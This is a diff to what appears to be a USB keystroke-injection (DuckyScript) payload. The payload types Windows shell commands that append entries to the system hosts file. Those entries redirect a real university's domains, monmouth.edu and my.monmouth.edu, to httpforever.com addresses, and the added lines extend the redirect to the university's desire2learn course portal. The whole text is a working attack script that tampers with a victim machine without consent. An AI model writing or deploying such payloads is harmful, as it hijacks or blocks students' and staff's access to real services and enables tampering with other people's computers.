@@ -23,7 +23,7 @@ STRING cd C:\Windows\System32\drivers\etc
 ENTER
 DELAY 500
 
-REM redirect monmouth.edu and my.monmouth.edu to httpforever.com
+REM redirect 3 different monmouth related sites to httpforever.com
 STRING echo. >> hosts
 ENTER
 STRING echo 2604:a880:4:1d0::1f1:2000 monmouth.edu >> hosts
@@ -33,6 +33,10 @@ ENTER
 STRING echo 2604:a880:4:1d0::1f1:2000 my.monmouth.edu >> hosts
 ENTER
 STRING echo 146.190.62.39 my.monmouth.edu >> hosts
+ENTER
+STRING echo 2604:a880:4:1d0::1f1:2000 monmouth.desire2learn.com >> hosts
+ENTER
+STRING echo 146.190.62.39 monmouth.desire2learn.com >> hosts
 ENTER
 DELAY 200
 
